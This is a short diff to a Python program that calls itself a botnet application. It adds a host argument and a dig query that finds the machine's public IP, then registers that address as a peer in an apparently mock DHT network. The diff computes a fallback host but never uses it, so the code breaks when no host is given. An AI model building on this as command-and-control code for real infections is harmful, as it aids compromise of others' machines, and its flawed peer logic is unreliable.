@@ -94,6 +94,7 @@ def parse_args() -> Namespace:
     parser = ArgumentParser(add_help = False)
     parser.add_argument("-m", "--master", action = "store_true")
     parser.add_argument("-p", "--port", type = int, default = 0)
+    parser.add_argument("-h", "--host", type = str)
     return parser.parse_args()
 
 
@@ -118,7 +119,7 @@ def start_master_mode(
         response = client.send_message(command)
         print(response)
 
-
+# python3 main.py -m -p 12423 -h $(dig +short txt ch whoami.cloudflare @1.0.0.1)
 if __name__ == "__main__":
     LOG.info("Welcome to botnet application. Thank you for being infected")
 
@@ -154,8 +155,12 @@ if __name__ == "__main__":
     dht = MockDHT(MOCK_DHT_ADDRESS)
     LOG.info("Tryind add peer {} to network".format(network_options.address))
     file_hash = os.environ.get("FILE_HASH", str())
-    dht.add_peers([network_options.address, ], file_hash)
 
+    # dig +short txt ch whoami.cloudflare @1.0.0.1
+    host = args.host if args.host else "0.0.0.0"
+    dht.add_peers([
+        Address(ip_address(args.host[1:len(args.host)-1]), network_options.address.port), ], file_hash)
+    
     try:
         LOG.info("Trying start server on {}".format(network_options.address))
         program = threading.Thread(target = partial(run_server, server))
